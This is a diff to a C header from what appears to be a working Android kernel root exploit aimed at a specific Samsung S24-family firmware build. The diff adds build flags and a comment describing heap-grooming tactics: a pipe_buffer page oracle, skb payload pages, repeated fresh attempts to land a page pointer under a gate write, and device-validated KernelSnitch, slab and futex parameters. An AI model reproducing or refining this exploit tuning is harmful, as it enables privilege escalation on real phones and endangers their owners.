@@ -2,8 +2,22 @@
 #define OFFSET_H
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define BUILD_VARIANT_LABEL "e1q-S9210ZHS6DZF2-app-physical-p0-oracle"
+#define BUILD_VARIANT_LABEL "e1q-S9210ZHS6DZF2-app-physical-p0-oracle-fresh"
 #define APP_PHYS_P0_ORACLE 1
+/*
+ * S24-family FRESH p0 session (aligned with the e1s and e2s profiles).
+ * The non-FRESH single-shot path never overlaps the stage-1 pipe pages and
+ * the stage-2 skb payload page (separate freed-pool rounds -> the p0 gate
+ * always misses).  FRESH re-runs the pipe oracle + payload page for every
+ * fresh attempt (up to APP_SLIDE_FRESH_PAGE_ATTEMPTS x search batches), so
+ * each round re-shapes the heap and gives the pipe_buffer .page field a fresh
+ * chance to land on pipebuf_page_base+0x800 where the gate write lands.
+ * Fingerprint table stays generator-forward (image-derived, do NOT enable
+ * APP_P0_FINGERPRINT_INVERSE_SLIDE); MM_SLAB_ORDER=0, futex hash 0x400 and
+ * the 4096/128/8 KernelSnitch profile stay device-validated.
+ */
+#define APP_REQUIRE_FRESH_P0_SESSION 1
+#define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
 #else
 #define BUILD_VARIANT_LABEL "e1q-S9210ZHS6DZF2-root-umh"
 #endif
